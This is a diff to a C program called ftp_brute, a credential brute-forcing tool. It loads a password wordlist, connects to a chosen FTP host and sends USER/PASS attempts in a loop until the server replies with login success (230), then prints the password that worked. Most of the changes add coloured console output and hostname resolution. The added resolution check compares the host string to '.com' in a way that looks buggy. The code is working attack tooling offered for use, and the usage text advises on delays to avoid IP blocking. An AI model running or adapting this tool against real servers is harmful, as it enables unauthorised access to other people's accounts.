@@ -29,6 +29,14 @@
 #include <string.h>
 #include <strings.h>
 
+#define NRM  "\x1B[0m"
+#define RED  "\x1B[31m"
+#define GRN  "\x1B[32m"
+#define YEL  "\x1B[33m"
+#define BLU  "\x1B[34m"
+#define MAG  "\x1B[35m"
+#define CYN  "\x1B[36m"
+#define WHT  "\x1B[37m"
 
 int port;
 char* host;
@@ -49,12 +57,14 @@ struct password {
 	struct password* next;
 };
 struct password* root;
+struct hostent *hp;
 
 int main(int argc, char* argv[]) {
 	if (argc == 1) {
-		printf("Usage: ./ftp_brute \n");
+		printf("%s[+]Usage: ./ftp_brute \n", GRN);
 		printf(
-				"Options:\n-p <port>\n-h <host>(Ip only)\n-d <delay between tries>\n-u <username>\n-pass <password file>\n");
+				"Options:\n-p <port>\n-h <host>(IP and .com only)\n-d <delay between tries>\n-u <username>\n-pass <password file>\n%s",
+				NRM);
 		goto bail;
 	}
 	if (proccess_args(argc, argv) == -1)
@@ -67,7 +77,7 @@ int main(int argc, char* argv[]) {
 		goto bail;
 	return 0;
 
-	bail: fprintf(stderr, "Execution failed.\n");
+	bail: fprintf(stderr, "%s[+]Execution failed.%s\n", RED, NRM);
 	return 1;
 }
 
@@ -95,27 +105,32 @@ int proccess_args(int argc, char* argv[]) {
 	}
 	return 0;
 }
-//
+
 int verify_values() { //
 	if (port == 0) {
-		printf("There was no port defined... using port 21.\n");
+		printf("%sThere was no port defined... using port 21.%s\n", YEL, NRM);
 		port = 21;
 	}
 	if (host == NULL) {
-		printf("No host was defined\n");
+		printf("%sNo host was defined%s\n", RED, NRM);
 		return -1;
 	}
 	if (password_file == NULL) {
-		printf("No password file was defined.\n");
+		printf("%sNo password file was defined.%s\n", RED, NRM);
 		return -1;
 	}
 	if (delay == 0) {
-		printf("No delay was defined.. using 5\n");
+		printf("%sNo delay was defined.. using 5%s\n", YEL, NRM);
 		delay = 5;
+	}
+	if (strcmp(host, ".com")) {
+		hp = gethostbyname(host);
+		host = inet_ntoa(*(struct in_addr *)hp->h_addr_list[0]);
 	}
 	memset(&sockaddr_, '0', sizeof(sockaddr_));
 	if (inet_pton(AF_INET, host, &(sockaddr_.sin_addr)) == 0) {
-		fprintf(stderr, "The ip given was invalid.\n");
+		printf("Host: %s", host);
+		fprintf(stderr, "%sThe ip given was invalid.\n%s", RED, NRM);
 		return -1;
 	}
 	return 0;
@@ -125,7 +140,7 @@ int load_list() {
 	FILE* fh = fopen(password_file, "r");
 
 	if (fh == NULL) {
-		fprintf(stderr, "No such file or directory.\n");
+		fprintf(stderr, "%s[+]No such file or directory.%s\n", RED, NRM);
 		return -1;
 	}
 
@@ -134,21 +149,20 @@ int load_list() {
 	flen = ftell(fh);
 	rewind(fh);
 
-	printf("Password list length: %d bytes\n", (int) flen);
+	printf("%s[+]Password list length: %d bytes%s\n", GRN, (int) flen, NRM);
 	root = malloc(sizeof(struct password));
 
 	struct password* curr = root;
 	char pstr[40];
-	printf("Loading word list, please wait this may take a while.\n");
-	while (fgets(pstr, sizeof(pstr), fh) != NULL)
-	{
-
+	printf("%s[+]Loading word list, please wait this may take a while.%s\n",
+			GRN, NRM);
+	while (fgets(pstr, sizeof(pstr), fh) != NULL) {
 		strcpy(curr->pstr, pstr); // Copy string pstr into curr->pstr
 		curr->next = malloc(sizeof(struct password));
 		curr = curr->next; // Change variable to next password
 	}
 	fclose(fh);
-	printf("Word list loaded.\n");
+	printf("%s[+]Word list loaded.%s\n", GRN, NRM);
 	return 0;
 }
 int login() {
@@ -157,22 +171,23 @@ int login() {
 	struct password* curr = root;
 	for (;;) // infinite for loop
 			{
-		printf("Attempting to connect...\n");
+		printf("%s[+]Attempting to connect...%s\n", GRN, NRM);
 		int sockfd = 0;
 		char recvbuf[1024]; // Max receive string 1024 bytes
 		char outbuf[1024];
 		if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
-			fprintf(stderr, "Kernel did not allocate us a socket\n");
+			fprintf(stderr, "%s[+]Kernel did not allocate us a socket%s\n", RED,
+					NRM);
 			return -1;
 		}
 		if (connect(sockfd, (struct sockaddr *) &sockaddr_, sizeof(sockaddr_))
-				< 0)
-				{
+				< 0) {
 			fprintf(stderr,
-					"Could not connect to host, Please check the address or if your delay is too low your IP could be blocked.\n");
+					"%s[+]Could not connect to host, Please check the address or if your delay is too low your IP could be blocked.%s\n",
+					RED, NRM);
 			return -1;
 		}
-		printf("Connected...\n");
+		printf("%s[+]Connected...%s\n", GRN, NRM);
 		int remaining = -1;
 		while (remaining != 0) {
 			bzero(recvbuf, sizeof(recvbuf));
@@ -183,8 +198,8 @@ int login() {
 
 		bzero(outbuf, sizeof(outbuf));
 		int len = sprintf(outbuf, "USER %s\x0d\x0a", user);
-		send(sockfd, (void*)&outbuf, len, 0);
-		printf("%d:%s\n",len, outbuf);
+		send(sockfd, (void*) &outbuf, len, 0);
+		printf("%d:%s\n", len, outbuf);
 
 		remaining = -1;
 		while (remaining != 0) {
@@ -196,7 +211,7 @@ int login() {
 
 		bzero(outbuf, sizeof(outbuf));
 		len = sprintf(outbuf, "PASS %s\r", curr->pstr);
-		send(sockfd, (void*)&outbuf, len, 0);
+		send(sockfd, (void*) &outbuf, len, 0);
 		printf("%s\n", outbuf);
 
 		remaining = -1;
@@ -204,13 +219,12 @@ int login() {
 			bzero(recvbuf, sizeof(recvbuf));
 			sreadl(sockfd, &recvbuf);
 			printf("%s\n", recvbuf);
-			if(recvbuf[0] == '5' && recvbuf[1] == '3' && recvbuf[2] == '0')
-			{
-				printf("===Auth Failure===\n");
-				printf("Trying next password...\n");
-			}
-			else if(recvbuf[0] == '2' && recvbuf[1] == '3' && recvbuf[2] == '0'){
-				printf("===Login Successful===\n");
+			if (recvbuf[0] == '5' && recvbuf[1] == '3' && recvbuf[2] == '0') {
+				printf("%s[+]===Auth Failure===[+]%s\n", RED, NRM);
+				printf("%s[+]Trying next password...%s\n", GRN, NRM);
+			} else if (recvbuf[0] == '2' && recvbuf[1] == '3'
+					&& recvbuf[2] == '0') {
+				printf("%s[+]===Login Successful===[+]%s\n", GRN, NRM);
 				success_pass = curr->pstr;
 				goto doublebreak;
 			}
@@ -221,25 +235,22 @@ int login() {
 		curr = curr->next;
 		sleep(delay); // Delay the users set time. - Just noticed it is in seconds not Mil haha
 	}
-	doublebreak:
-	printf("Username: %s\n", user);
-	printf("Successful pass: %s\n", success_pass);
-	printf("Brute force done.\n");
+	doublebreak: printf("%s[+]Username: %s%s\n", GRN, user, NRM);
+	printf("%s[+]Successful pass: %s%s\n", GRN, success_pass, NRM);
+	printf("%s[+]Brute force done.%s\n", GRN, NRM);
 	return 0;
 }
 int sreadl(int sockfd, void* buf) {
 	char* line = buf;
 	size_t index = 0;
 	char c;
-	for(;;)
-	{
+	for (;;) {
 		size_t s = read(sockfd, &c, sizeof(c));
 		if (s == EOF)
 			break;
-		if(c == '\r')
-		{
+		if (c == '\r') {
 			read(sockfd, &c, sizeof(c));
-			if(c == '\n')
+			if (c == '\n')
 				break;
 		}
 		*line++ = c;
